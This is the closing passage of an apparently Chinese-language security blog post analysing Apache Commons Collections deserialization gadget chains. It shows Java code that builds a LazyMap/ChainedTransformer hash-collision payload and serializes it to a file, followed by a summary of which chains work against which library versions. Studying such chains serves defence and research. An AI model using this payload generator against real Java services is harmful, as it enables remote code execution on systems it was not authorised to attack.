</span></span><span style=display:flex><span>        LazyMap lazyMap2 <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>LazyMap<span style=color:#ff79c6>)</span> LazyMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>decorate</span><span style=color:#ff79c6>(</span>innerMap2<span style=color:#ff79c6>,</span> chainedTransformer<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        HashMap hashMap <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        hashMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>lazyMap1<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;placeholder&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        hashMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>lazyMap2<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;placeholder&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        innerMap1<span style=color:#ff79c6>.</span><span style=color:#50fa7b>remove</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;zZ&#34;</span><span style=color:#ff79c6>);</span> <span style=color:#6272a4>// 在 put 的时候产生碰撞, 根据上面的分析调用 LazyMap.get, LazyMap 会将结果存入 innerMap 中缓存, 所以这里需要将其清除, 否则 hashcode 就不一样了 
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>        Field field <span style=color:#ff79c6>=</span> chainedTransformer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;iTransformers&#34;</span><span style=color:#ff79c6>);</span> <span style=color:#6272a4>// 同上, 将真正的 transformers 设置, 不然在生成 exp 时就会执行命令, 自己打自己了
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>chainedTransformer<span style=color:#ff79c6>,</span> transformers<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectOutputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileOutputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>writeObject</span><span style=color:#ff79c6>(</span>hashMap<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><h2 id=总结>总结</h2><p>可以看到这些 chain 最后均需要经过 InvokerTransformer 或者 InstantiateTransformer. commons-collections 的修复也是着力于重点, 直接 ban 掉这两个类的 readObject, 一劳永逸.<br>而这些中对于 commons-collections4, 比较实用的是 CommonsCollections2, CommonsCollections4. 对于 commons-collections3, 为 CommonsCollections6, CommonsCollections7. 利用能否成功只与 commons-collections 自身的版本有关, 而与 jre 的版本没有太大关系, 只要不要是远古版本即可. 而且实际上不少 chain 是两者都通用的, 只不过 ysoserial 没有编写, 只需要稍稍修改就行.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/web>web</a></li><li><a href=/tags/java>java</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>